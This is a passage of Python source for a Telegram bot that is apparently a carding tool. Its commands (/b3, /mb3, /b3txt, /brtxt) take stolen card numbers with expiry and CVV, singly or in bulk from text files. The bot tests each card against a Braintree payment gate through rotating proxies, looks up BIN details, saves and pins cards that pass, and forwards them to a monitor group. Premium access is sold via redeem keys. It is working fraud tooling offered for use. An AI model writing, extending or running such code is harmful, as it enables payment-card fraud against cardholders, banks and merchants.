            f"{pe(E['bolt'])} {bold('Total:')} {bold(str(total))}\n"
            f"{pe(E['gem'])} {bold('Approved:')} {bold(str(approved))}\n"
            f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
            f"{pe(E['warn'])} {bold('Skipped:')} {bold(str(skipped))}\n"
            f"{pe(E['hourglass'])} {bold('Time:')} {bold(elapsed_str)}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} "
            f"{user_link(user_id, user_name, user_uname)}"
        )
    except Exception:
        pass


@router.message(Command("brtxt"))
async def cmd_brtxt(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.is_owner(user_id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Owner Only Command!')}"
        )
        return

    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} {bold('Send a .txt file with CCs')}\n"
            f"{pe(E['next'])} {bold('Reply to the file with')} /brtxt\n\n"
            f"{pe(E['bolt'])} {bold('Format:')} cc|mm|yy|cvv {bold('(one per line)')}"
        )
        return

    doc = message.reply_to_message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await message.reply(f"{pe(E['cross'])} {bold('Only .txt files are supported!')}")
        return

    proxy_list = get_user_proxies(user_id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add proxies first with')} /proxy"
        )
        return

    import io
    buf = io.BytesIO()
    try:
        await bot.download(doc.file_id, destination=buf)
        buf.seek(0)
        file_text = buf.read().decode("utf-8", errors="ignore")
    except Exception:
        await message.reply(f"{pe(E['cross'])} {bold('Failed to download file!')}")
        return

    from helpers import CC_PATTERN
    all_ccs: list[str] = []
    for m in CC_PATTERN.finditer(file_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)
    if not all_ccs:
        for line in file_text.strip().splitlines():
            parts = re.split(r"[|/]", line.strip())
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found in the file!')}")
        return

    cc_limit = auth.get_cc_limit(user_id)
    if len(all_ccs) > cc_limit:
        all_ccs = all_ccs[:cc_limit]
        await message.reply(
            f"{pe(E['warn'])} {bold('CC limit reached!')} "
            f"{bold(str(cc_limit))} {bold('CCs max. Extra skipped.')}"
        )

    if user_id in _BRTXT_ACTIVE_USERS:
        await message.reply(
            f"{pe(E['warn'])} {bold('Your B3 file check is already in progress!')}\n\n"
            f"{pe(E['next'])} {bold('Wait for it to complete or tap Stop.')}"
        )
        return

    stop_key = f"brtxt:{message.chat.id}:{user_id}"
    _BRTXT_STOP_FLAGS[stop_key] = False
    _BRTXT_ACTIVE_USERS.add(user_id)

    total      = len(all_ccs)
    user_name  = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""

    try:
        stop_btn = {
            "inline_keyboard": [[{
                "text": "🛑 Stop Checking",
                "callback_data": f"brtxt_stop:{stop_key}",
            }]]
        }
        status_msg = await message.reply(
            f"{pe(E['rocket'])} {bold('B3 File Check Started!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total CCs:')} {bold(str(total))}\n"
            f"{pe(E['hourglass'])} {bold('Batch Size:')} {bold(str(BRTXT_BATCH))}\n"
            f"{pe(E['refresh'])} {bold('Random proxy per CC')}\n"
            f"{pe(E['globe'])} {bold('Gate:')} {bold('Braintree Auth')}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} "
            f"{user_link(user_id, user_name, user_uname)}",
            reply_markup=stop_btn,
        )
        await _process_brtxt(
            all_ccs, user_id, user_name, user_uname,
            message.chat.id, status_msg, stop_key, proxy_list,
        )
    finally:
        _BRTXT_ACTIVE_USERS.discard(user_id)


@router.callback_query(F.data.startswith("brtxt_stop:"))
async def cb_brtxt_stop(callback: types.CallbackQuery):
    stop_key  = callback.data.split(":", 1)[1]
    clicker   = callback.from_user.id
    try:
        owner_id = int(stop_key.split(":")[-1])
    except (ValueError, IndexError):
        owner_id = 0

    if clicker != owner_id and not auth.is_admin(clicker):
        await callback.answer(bold("Only the owner can stop this!"), show_alert=True)
        return

    _BRTXT_STOP_FLAGS[stop_key] = True
    await callback.answer(bold("Stopping..."), show_alert=False)
    try:
        await callback.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  WRAPUNZEL BRAINTREE GATE  /b3  /mb3  /b3txt
# ══════════════════════════════════════════════════════════════════════════════

MB3_MAX_CCS   = 10
B3TXT_BATCH   = 5

_MB3_EDIT_LOCKS:   dict[int, asyncio.Lock] = {}
_B3TXT_STOP_FLAGS: dict[str, bool] = {}
_B3TXT_ACTIVE_USERS: set[int] = set()


# ── Helpers ───────────────────────────────────────────────────────────────────

def _b3w_status_line(status: str, msg: str, code: str) -> str:
    if code == "cvv_approved" or status == "approved":
        return f"{pe(E['gem'])} {bold('CVV Approved — Card Added!')}"
    if code == "ccn" or status == "ccn":
        return f"{pe(E['check2'])} {bold('CCN — Card Number Valid!')}"
    if code in ("proxy_error", "connection_error"):
        return f"{pe(E['warn'])} {bold('Proxy / Connection Error')}"
    if status == "declined":
        return f"{pe(E['cross'])} {bold('Declined')}"
    return f"{pe(E['warn2'])} {bold(msg[:60])}"


def _b3w_run_check(cc_str: str, proxy_list: list, max_retries: int = 1) -> tuple[str, str, str]:
    """Sync wrapper — runs b3wrapunzel.b3w_check_card with proxy rotation."""
    if b3wrapunzel is None:
        return "error", "b3wrapunzel.py not found on server", "module_missing"
    parts = cc_str.split("|")
    if len(parts) < 4:
        return "error", "Invalid CC format", "bad_format"
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]

    last_status, last_msg, last_code = "error", "All retries failed", "failed"
    tried_proxies: set[int] = set()

    for attempt in range(max_retries + 1):
        available = [p for p in proxy_list if id(p) not in tried_proxies]
        if not available:
            available = proxy_list
        proxy_data = random.choice(available) if available else None
        if proxy_data:
            tried_proxies.add(id(proxy_data))
        proxy_url = _proxy_dict_to_url(proxy_data) if proxy_data else None

        try:
            status, msg, code = b3wrapunzel.b3w_check_card(cc, mm, yy, cvv, proxy_url=proxy_url)
        except Exception as e:
            last_msg  = str(e)[:80]
            last_code = "exception"
            continue

        last_status, last_msg, last_code = status, msg, code

        if code in ("proxy_error", "connection_error") and attempt < max_retries:
            continue
        return status, msg, code

    return last_status, last_msg, last_code


# ── /b3 — single check (all premium users) ───────────────────────────────────

@router.message(Command("b3"))
async def cmd_b3(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if b3wrapunzel is None:
        await message.reply(
            f"{pe(E['cross'])} {bold('B3 gate unavailable')}\n\n"
            f"{pe(E['warn'])} {bold('Upload b3wrapunzel.py to the bot folder.')}"
        )
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    cc_str = None
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        cc_str = extract_cc(args[1])
        if not cc_str:
            parts = re.split(r'[|/]', args[1].strip())
            if len(parts) >= 4:
                cc_str = "|".join(p.strip() for p in parts[:4])
    if not cc_str and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        cc_str = extract_cc(reply_text)

    if not cc_str:
        await message.reply(
            f"{pe(E['warn'])} {bold('No CC found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')} /b3 4111111111111111|01|2030|123\n"
            f"{pe(E['next'])} {bold('Or reply to a message containing a CC.')}"
        )
        return

    proxy_list = get_user_proxies(user_id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add proxies first with')} /proxy"
        )
        return

    bin_num = cc_str.split("|")[0][:6]
    loading_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Checking CC...')}\n\n"
        f"{pe(E['bolt'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(E['globe'])} {bold('Gate:')} {bold('B3 Auth')}\n"
        f"{pe(E['hourglass'])} {bold('Processing...')}"
    )

    _bin = asyncio.create_task(bin_lookup(bin_num))
    sem  = get_user_semaphore(user_id)
    async with sem:
        try:
            status, msg, code = await asyncio.get_running_loop().run_in_executor(
                CHECKER_POOL, lambda: _b3w_run_check(cc_str, proxy_list),
            )
        except Exception as e:
            status, msg, code = "error", str(e)[:80], "exception"
    bin_info = await _bin

    sl = _b3w_status_line(status, msg, code)
    result_text = (
        f"{sl}\n\n"
        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('Gate:')} {bold('B3 Auth')}\n"
        f"{pe(R['gate'])} {bold('Response:')} {bold(msg[:120])}\n\n"
        f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
        f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
        f"{pe(R['type'])} {bold('Type:')} {bold(bin_info['type'])}\n"
        f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
        f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
        f"{pe(R['country'])} {bold('Country:')} {bin_info['flag']} {bold(bin_info['country'])}\n\n"
        f"{pe(R['checked_by'])} {bold('Checked by:')} "
        f"{user_link(message.from_user.id, message.from_user.full_name, message.from_user.username)}"
    )

    await safe_edit(loading_msg, result_text)

    if status == "approved":
        auth.save_charged_cc(
            cc_str, user_id,
            message.from_user.full_name or "Unknown",
            "B3 Auth", "-",
        )
        try:
            await bot.pin_chat_message(
                message.chat.id, loading_msg.message_id, disable_notification=True,
            )
        except Exception:
            pass
        try:
            await bot.send_message(auth.MONITOR_GROUP_ID, result_text)
        except Exception:
            pass
    elif status == "ccn":
        await _send_approved(result_text)


# ── /mb3 — mass Wrapunzel B3 check (owner only) ──────────────────────────────

async def _mb3_check_single(
    cc_str: str, proxy_list: list,
    status_msg: types.Message, results: dict, order: list,
    user_name: str, user_uname: str, user_id: int,
):
    sem  = get_user_semaphore(user_id)
    _bin = asyncio.create_task(bin_lookup(cc_str.split("|")[0][:6]))
    async with sem:
        try:
            status, msg, code = await asyncio.get_running_loop().run_in_executor(
                CHECKER_POOL, lambda: _b3w_run_check(cc_str, proxy_list),
            )
        except Exception as e:
            status, msg, code = "error", str(e)[:80], "exception"

    bin_info = await _bin
    results[cc_str] = {"status": status, "msg": msg, "code": code, "bin": bin_info}

    if status == "approved":
        auth.save_charged_cc(cc_str, user_id, user_name, "B3 Auth", "-")

    msg_id = status_msg.message_id
    if msg_id not in _MB3_EDIT_LOCKS:
        _MB3_EDIT_LOCKS[msg_id] = asyncio.Lock()

    async with _MB3_EDIT_LOCKS[msg_id]:
        done  = sum(1 for cc in order if cc in results)
        total = len(order)
        lines = [f"{pe(E['bolt'])} {bold('B3W Mass Check')} [{bold(str(done))}/{bold(str(total))}]\n"]

        for cc in order:
            if cc in results:
                e  = results[cc]
                sl = _b3w_status_line(e["status"], e["msg"], e["code"])
                bi = e["bin"]
                bin_line = (
                    f"{bi['brand']} | {bi['type']} | {bi['level']} | "
                    f"{bi['bank']} | {bi['flag']} {bi['country']}"
                )
                lines.append(
                    f"{sl}\n"
                    f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                    f"{pe(R['gate'])} {bold('Gate:')} {bold('B3 Auth')}\n"
                    f"{pe(R['gate'])} {bold('Response:')} {bold(e['msg'][:80])}\n"
                    f"{pe(R['bin_info'])} {bold('BIN:')} {bold(bin_line)}"
                )
            else:
                lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}")

        lines.append(
            f"\n{pe(R['checked_by'])} {bold('Checked by:')} "
            f"{user_link(user_id, user_name, user_uname)}"
        )
        try:
            await safe_edit(status_msg, "\n\n".join(lines))
        except Exception:
            pass

    if done == total:
        _MB3_EDIT_LOCKS.pop(msg_id, None)


@router.message(Command("mb3"))
async def cmd_mb3(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if b3wrapunzel is None:
        await message.reply(
            f"{pe(E['cross'])} {bold('B3 gate unavailable')}\n\n"
            f"{pe(E['warn'])} {bold('Upload b3wrapunzel.py to the bot folder.')}"
        )
        return

    if not auth.is_owner(user_id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner Only Command!')}")
        return

    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]
    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text

    if not raw_text.strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('No CCs found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')} /mb3 then paste up to {MB3_MAX_CCS} CCs\n"
            f"{pe(E['next'])} {bold('One per line:')} cc|mm|yy|cvv"
        )
        return

    from helpers import CC_PATTERN
    all_ccs: list[str] = []
    for m in CC_PATTERN.finditer(raw_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)
    if not all_ccs:
        for line in raw_text.strip().splitlines():
            parts = re.split(r"[|/]", line.strip())
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found!')}")
        return

    all_ccs = all_ccs[:MB3_MAX_CCS]

    proxy_list = get_user_proxies(user_id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add proxies first with')} /proxy"
        )
        return

    user_name  = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total      = len(all_ccs)

    init_lines = [f"{pe(E['bolt'])} {bold('B3W Mass Check')} [{bold('0')}/{bold(str(total))}]\n"]
    for cc in all_ccs:
        init_lines.append(
            f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}"
        )
    init_lines.append(
        f"\n{pe(R['checked_by'])} {bold('Checked by:')} "
        f"{user_link(user_id, user_name, user_uname)}"
    )
    status_msg = await message.reply("\n\n".join(init_lines))

    results: dict = {}
    order = list(all_ccs)
    tasks = [
        asyncio.create_task(
            _mb3_check_single(
                cc, proxy_list, status_msg, results, order,
                user_name, user_uname, user_id,
            )
        )
        for cc in all_ccs
    ]
    await asyncio.gather(*tasks, return_exceptions=True)

    # Post-check: pin approved, send CCN to approved group
    _mb3_approved_sent = False
    for cc in order:
        if cc not in results:
            continue
        e = results[cc]
        if e["status"] == "approved" and not _mb3_approved_sent:
            _mb3_approved_sent = True
            try:
                await bot.pin_chat_message(
                    message.chat.id, status_msg.message_id, disable_notification=True,
                )
            except Exception:
                pass
            try:
                charged_text = (
                    f"{pe(E['gem'])} {bold('B3W CVV Approved!')}\n"
                    f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                    f"{pe(R['gate'])} {bold('Gate:')} {bold('B3 Auth')}\n"
                    f"{pe(R['gate'])} {bold('Response:')} {bold(e['msg'][:80])}\n\n"
                    f"{pe(R['checked_by'])} {bold('Checked by:')} "
                    f"{user_link(user_id, user_name, user_uname)}"
                )
                await bot.send_message(auth.MONITOR_GROUP_ID, charged_text)
            except Exception:
                pass
        elif e["status"] == "ccn":
            try:
                bi = e["bin"]
                bin_line = (
                    f"{bi['brand']} | {bi['type']} | {bi['level']} | "
                    f"{bi['bank']} | {bi['flag']} {bi['country']}"
                )
                appr_text = (
                    f"{_b3w_status_line(e['status'], e['msg'], e['code'])}\n\n"
                    f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                    f"{pe(R['gate'])} {bold('Gate:')} {bold('B3 Auth')}\n"
                    f"{pe(R['gate'])} {bold('Response:')} {bold(e['msg'][:80])}\n"
                    f"{pe(R['bin_info'])} {bold('BIN:')} {bold(bin_line)}\n\n"
                    f"{pe(R['checked_by'])} {bold('Checked by:')} "
                    f"{user_link(user_id, user_name, user_uname)}"
                )
                await _send_approved(appr_text)
            except Exception:
                pass


# ── /b3txt — Wrapunzel file batch check (owner only) ─────────────────────────

async def _process_b3txt(
    all_ccs: list[str],
    user_id: int, user_name: str, user_uname: str,
    chat_id: int, status_msg: types.Message,
    stop_key: str, proxy_list: list,
):
    total = len(all_ccs)
    checked = approved = ccn_count = declined = skipped = 0
    _start  = time.time()
    _last_edit = 0.0

    async def _wrap(cc: str):
        """Return (status, msg, code, cc) — cc travels with the result."""
        sem = get_user_semaphore(user_id)
        async with sem:
            try:
                status, msg, code = await asyncio.get_running_loop().run_in_executor(
                    CHECKER_POOL, lambda: _b3w_run_check(cc, proxy_list),
                )
            except Exception as e:
                status, msg, code = "error", str(e)[:80], "exception"
        return status, msg, code, cc

    try:
        for i in range(0, total, B3TXT_BATCH):
            if _B3TXT_STOP_FLAGS.get(stop_key):
                skipped += total - i
                break

            batch = all_ccs[i:i + B3TXT_BATCH]
            wrapped = [
                asyncio.create_task(_wrap(cc))
                for cc in batch
                if not _B3TXT_STOP_FLAGS.get(stop_key)
            ]
            if not wrapped:
                continue

            for fut in asyncio.as_completed(wrapped):
                status, msg, code, cc = await fut
                if _B3TXT_STOP_FLAGS.get(stop_key):
                    skipped += 1
                    continue

                checked += 1
                is_approved = status == "approved"
                is_ccn      = status == "ccn"

                should_send = is_approved or is_ccn
                if is_approved:
                    approved += 1
                    auth.save_charged_cc(cc, user_id, user_name, "B3 Auth", "-")
                elif is_ccn:
                    ccn_count += 1
                    approved  += 1
                else:
                    declined += 1

                if should_send:
                    bin_num  = cc.split("|")[0][:6]
                    bin_info = await bin_lookup(bin_num)
                    sl       = _b3w_status_line(status, msg, code)
                    hit_text = (
                        f"{sl}\n\n"
                        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                        f"{pe(R['gate'])} {bold('Gate:')} {bold('B3 Auth')}\n"
                        f"{pe(R['gate'])} {bold('Response:')} {bold(msg[:100])}\n\n"
                        f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
                        f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
                        f"{pe(R['type'])} {bold('Type:')} {bold(bin_info['type'])}\n"
                        f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
                        f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
                        f"{pe(R['country'])} {bold('Country:')} "
                        f"{bin_info['flag']} {bold(bin_info['country'])}\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} "
                        f"{user_link(user_id, user_name, user_uname)}"
                    )
                    try:
                        sent = await bot.send_message(chat_id, hit_text)
                        if is_approved:
                            try:
                                await bot.pin_chat_message(
                                    chat_id, sent.message_id, disable_notification=True,
                                )
                            except Exception:
                                pass
                            try:
                                await bot.send_message(auth.MONITOR_GROUP_ID, hit_text)
                            except Exception:
                                pass
                        else:
                            await _send_approved(hit_text)
                    except Exception:
                        pass

                _now = time.time()
                if _now - _last_edit >= 3 or (checked + skipped) >= total:
                    _last_edit = _now
                    stop_btn = {
                        "inline_keyboard": [[{
                            "text": "🛑 Stop Checking",
                            "callback_data": f"b3txt_stop:{stop_key}",
                        }]]
                    }
                    progress = (
                        f"{pe(E['rocket'])} {bold('B3W File Check')}\n\n"
                        f"{pe(E['bolt'])} {bold('Last:')} {bold(msg[:60])}\n"
                        f"{pe(R['cc'])} <tg-spoiler>{cc}</tg-spoiler>\n\n"
                        f"{pe(E['bolt'])} {bold('Progress:')} "
                        f"{bold(str(checked + skipped))}/{bold(str(total))}\n"
                        f"{pe(E['gem'])} {bold('Approved:')} {bold(str(approved))}\n"
                        f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
                        f"{pe(E['hourglass'])} {bold('Remaining:')} "
                        f"{bold(str(total - checked - skipped))}\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} "
                        f"{user_link(user_id, user_name, user_uname)}"
                    )
                    try:
                        if (checked + skipped) >= total:
                            await safe_edit(status_msg, progress)
                        else:
                            await safe_edit(status_msg, progress, reply_markup=stop_btn)
                    except Exception:
                        pass

    finally:
        _B3TXT_STOP_FLAGS.pop(stop_key, None)

    elapsed = int(time.time() - _start)
    elapsed_str = f"{elapsed // 60}m {elapsed % 60}s" if elapsed >= 60 else f"{elapsed}s"
    try:
        await safe_edit(status_msg, 
            f"{pe(E['check'])} {bold('B3W File Check Complete!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total:')} {bold(str(total))}\n"
            f"{pe(E['gem'])} {bold('Approved:')} {bold(str(approved))}\n"
            f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
            f"{pe(E['warn'])} {bold('Skipped:')} {bold(str(skipped))}\n"
            f"{pe(E['hourglass'])} {bold('Time:')} {bold(elapsed_str)}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} "
            f"{user_link(user_id, user_name, user_uname)}"
        )
    except Exception:
        pass


@router.message(Command("b3txt"))
async def cmd_b3txt(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if b3wrapunzel is None:
        await message.reply(
            f"{pe(E['cross'])} {bold('B3 gate unavailable')}\n\n"
            f"{pe(E['warn'])} {bold('Upload b3wrapunzel.py to the bot folder.')}"
        )
        return

    if not auth.is_owner(user_id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner Only Command!')}")
        return

    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} {bold('Send a .txt file with CCs')}\n"
            f"{pe(E['next'])} {bold('Reply to the file with')} /b3txt\n\n"
            f"{pe(E['bolt'])} {bold('Format:')} cc|mm|yy|cvv {bold('(one per line)')}"
        )
        return

    doc = message.reply_to_message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await message.reply(f"{pe(E['cross'])} {bold('Only .txt files are supported!')}")
        return

    proxy_list = get_user_proxies(user_id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add proxies first with')} /proxy"
        )
        return

    import io
    buf = io.BytesIO()
    try:
        await bot.download(doc.file_id, destination=buf)
        buf.seek(0)
        file_text = buf.read().decode("utf-8", errors="ignore")
    except Exception:
        await message.reply(f"{pe(E['cross'])} {bold('Failed to download file!')}")
        return

    from helpers import CC_PATTERN
    all_ccs: list[str] = []
    for m in CC_PATTERN.finditer(file_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)
    if not all_ccs:
        for line in file_text.strip().splitlines():
            parts = re.split(r"[|/]", line.strip())
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found in the file!')}")
        return

    cc_limit = auth.get_cc_limit(user_id)
    if len(all_ccs) > cc_limit:
        all_ccs = all_ccs[:cc_limit]
        await message.reply(
            f"{pe(E['warn'])} {bold('CC limit reached!')} "
            f"{bold(str(cc_limit))} {bold('CCs max. Extra skipped.')}"
        )

    if user_id in _B3TXT_ACTIVE_USERS:
        await message.reply(
            f"{pe(E['warn'])} {bold('Your B3W file check is already in progress!')}\n\n"
            f"{pe(E['next'])} {bold('Wait for it to complete or tap Stop.')}"
        )
        return

    stop_key = f"b3txt:{message.chat.id}:{user_id}"
    _B3TXT_STOP_FLAGS[stop_key] = False
    _B3TXT_ACTIVE_USERS.add(user_id)

    total      = len(all_ccs)
    user_name  = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""

    try:
        stop_btn = {
            "inline_keyboard": [[{
                "text": "🛑 Stop Checking",
                "callback_data": f"b3txt_stop:{stop_key}",
            }]]
        }
        status_msg = await message.reply(
            f"{pe(E['rocket'])} {bold('B3W File Check Started!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total CCs:')} {bold(str(total))}\n"
            f"{pe(E['hourglass'])} {bold('Batch Size:')} {bold(str(B3TXT_BATCH))}\n"
            f"{pe(E['refresh'])} {bold('Random proxy per CC')}\n"
            f"{pe(E['globe'])} {bold('Gate:')} {bold('B3 Auth')}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} "
            f"{user_link(user_id, user_name, user_uname)}",
            reply_markup=stop_btn,
        )
        await _process_b3txt(
            all_ccs, user_id, user_name, user_uname,
            message.chat.id, status_msg, stop_key, proxy_list,
        )
    finally:
        _B3TXT_ACTIVE_USERS.discard(user_id)


@router.callback_query(F.data.startswith("b3txt_stop:"))
async def cb_b3txt_stop(callback: types.CallbackQuery):
    stop_key = callback.data.split(":", 1)[1]
    clicker  = callback.from_user.id
    try:
        owner_id = int(stop_key.split(":")[-1])
    except (ValueError, IndexError):
        owner_id = 0

    if clicker != owner_id and not auth.is_admin(clicker):
        await callback.answer("Only the owner can stop this!", show_alert=True)
        return

    _B3TXT_STOP_FLAGS[stop_key] = True
    await callback.answer("Stopping...", show_alert=False)
    try:
        await callback.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  FEEDBACK  /f
# ══════════════════════════════════════════════════════════════════════════════

FEEDBACK_GROUP_ID = -1002554500064

_FB_EMOJIS = [
    E["star"], E["gem"], E["rocket"], E["sparkle"], E["bolt"],
    E["bolt2"], E["bolt3"], E["bolt4"], E["bolt5"], E["check"],
    E["check2"], E["check3"], E["gift"], E["globe"], E["chat"],
    E["chat2"], E["dice"], E["bank"],
]

def _fb_e() -> str:
    return pe(random.choice(_FB_EMOJIS))


def _fb_shift_entities(
    entities: list[types.MessageEntity] | None,
    text: str,
    skip_prefix: int,
) -> list[types.MessageEntity]:
    """Keep entities inside ``text`` after removing ``skip_prefix`` chars from the start."""
    if not entities or skip_prefix <= 0:
        return list(entities or [])
    out: list[types.MessageEntity] = []
    for ent in entities:
        if ent.type == MessageEntityType.BOT_COMMAND and ent.offset == 0:
            continue
        new_off = ent.offset - skip_prefix
        if new_off < 0:
            continue
        if new_off + ent.length > len(text):
            continue
        out.append(types.MessageEntity(
            type=ent.type,
            offset=new_off,
            length=ent.length,
            url=getattr(ent, "url", None),
            user=getattr(ent, "user", None),
            language=getattr(ent, "language", None),
            custom_emoji_id=getattr(ent, "custom_emoji_id", None),
        ))
    return out


def _fb_text_to_html(text: str, entities: list[types.MessageEntity] | None) -> str:
    """Plain text + entities → HTML; custom premium emoji kept as ``<tg-emoji>``."""
    if not text:
        return ""
    if not entities:
        return _html.escape(text)

    custom = [
        e for e in entities
        if e.type == MessageEntityType.CUSTOM_EMOJI and getattr(e, "custom_emoji_id", None)
    ]
    if not custom:
        return _html.escape(text)

    custom.sort(key=lambda e: e.offset)
    parts: list[str] = []
    pos = 0
    for ent in custom:
        if ent.offset > pos:
            parts.append(_html.escape(text[pos:ent.offset]))
        eid = str(ent.custom_emoji_id)
        parts.append(pe(eid))
        pos = ent.offset + ent.length
    parts.append(_html.escape(text[pos:]))
    return "".join(parts)


def _fb_parse_input(message: types.Message) -> tuple[str | None, str, list[types.MessageEntity]]:
    """Return (photo_file_id, feedback_text, entities for feedback text)."""
    photo: str | None = None
    caption = ""
    entities: list[types.MessageEntity] = []

    if message.photo:
        photo = message.photo[-1].file_id
        raw = (message.caption or "").strip()
        prefix = 0
        if raw.startswith("/f"):
            parts = raw.split(maxsplit=1)
            prefix = len(parts[0])
            caption = parts[1].strip() if len(parts) > 1 else ""
        else:
            caption = raw
        entities = _fb_shift_entities(message.caption_entities, caption, prefix)

    elif message.reply_to_message and message.reply_to_message.photo:
        photo = message.reply_to_message.photo[-1].file_id
        reply_cap = (message.reply_to_message.caption or "").strip()
        cmd_text = (message.text or "").strip()
        if cmd_text.startswith("/f"):
            parts = cmd_text.split(maxsplit=1)
            cmd_prefix = len(parts[0])
            cmd_body = parts[1].strip() if len(parts) > 1 else ""
            if cmd_body:
                if reply_cap:
                    caption = reply_cap + "\n" + cmd_body
                    entities = list(message.reply_to_message.caption_entities or [])
                    base = len(reply_cap) + 1
                    for ent in _fb_shift_entities(message.entities, cmd_body, cmd_prefix):
                        entities.append(types.MessageEntity(
                            type=ent.type,
                            offset=ent.offset + base,
                            length=ent.length,
                            url=getattr(ent, "url", None),
                            user=getattr(ent, "user", None),
                            language=getattr(ent, "language", None),
